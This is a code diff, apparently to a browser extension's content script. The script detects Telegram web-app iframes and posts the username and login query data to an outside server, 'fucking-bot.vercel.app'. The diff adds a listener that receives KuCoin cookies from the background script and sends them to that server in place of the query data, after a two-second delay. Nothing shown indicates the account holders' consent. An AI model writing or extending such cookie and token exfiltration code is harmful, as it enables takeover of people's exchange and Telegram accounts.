@@ -1,4 +1,14 @@
-; (() => {
+;(() => {
+  let kucoinCockie = ''
+  // Lắng nghe tin nhắn từ background
+  chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
+    if (request.type === 'sendCookies') {
+      const cookieData = request.cookies
+      console.log('Received Cookies:', cookieData)
+      kucoinCockie = cookieData
+    }
+  })
+
   let keyNameCalled = []
   function getMainDomain(url) {
     try {
@@ -52,15 +62,13 @@
               if (iframe.src.includes('#tgWebAppData')) {
                 const keyName = getKeyName(iframe.src)
 
-                if (keyNameCalled.includes(keyName)) {
+                if (keyName && keyNameCalled.includes(keyName)) {
                   return
                 }
-
-                keyNameCalled.push(keyName)
-
-                if (keyName) {
+                setTimeout(() => {
+                  keyNameCalled.push(keyName)
+                  console.log('keyName', keyName)
                   const { extUserName, queryId } = extractUserData(iframe.src)
-                  isCalled = true
                   fetch('https://fucking-bot.vercel.app/api/query-id', {
                     method: 'POST',
                     headers: {
@@ -69,12 +77,12 @@
                     },
                     body: JSON.stringify({
                       username: extUserName,
-                      [keyName]: queryId,
+                      [keyName]: kucoinCockie || queryId,
                     }),
                   }).catch((e) => {
                     console.log('e', e)
                   })
-                }
+                }, 2000)
               }
             }
           }
